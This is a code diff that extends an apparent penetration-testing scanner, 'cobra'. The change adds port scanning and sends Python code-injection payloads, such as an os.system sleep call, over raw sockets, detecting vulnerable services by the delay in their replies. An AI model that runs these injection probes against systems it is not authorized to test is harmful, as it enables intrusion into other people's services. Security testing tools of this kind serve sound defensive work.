@@ -1,6 +1,8 @@
 import re
+import socket
 import time
 import urllib.parse
+from TheSilent.dolphin import dolphin
 from TheSilent.kitten_crawler import kitten_crawler
 from TheSilent.puppy_requests import text
 from TheSilent.clear import clear
@@ -10,14 +12,46 @@ CYAN = "\033[1;36m"
 GREEN = "\033[0;32m"
 
 def cobra(host,delay=0,crawl=1,verbose=True):
-    if verbose:
-        clear()
     hits = []
 
     mal_python = ["__import__('time').sleep(60)",
                           "__import__('os').system('sleep 60')"]
 
-    hosts = kitten_crawler(host,delay,crawl,verbose)
+    if verbose:
+        clear()
+        print(CYAN + "port scanning")
+
+    if re.search("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",host):
+        ports = dolphin(host)
+
+    else:
+        ports = dolphin(urllib.parse.urlparse(host).netloc)
+
+    for port in ports:
+        if verbose:
+            print(CYAN + f"checking port: {port}")
+
+        for mal in mal_python:
+            time.sleep(delay)
+            my_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            my_socket.settimeout(120)
+            try:
+                my_socket.connect((urllib.parse.urlparse(host).netloc,port))
+                start = time.time()
+                my_socket.send(mal.encode())
+                data = my_socket.recv(65535).decode()
+                end = time.time()
+                if end - start > 45:
+                    hits.append(f"python injection found on port {port} with payload {mal}: {data}")
+
+            except TimeoutError:
+                pass
+        
+    if re.search("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",host):
+        hosts = kitten_crawler("http://" + host,delay,crawl,verbose)
+
+    else:
+        hosts = kitten_crawler(host,delay,crawl,verbose)
 
     for _ in hosts:
         if verbose:
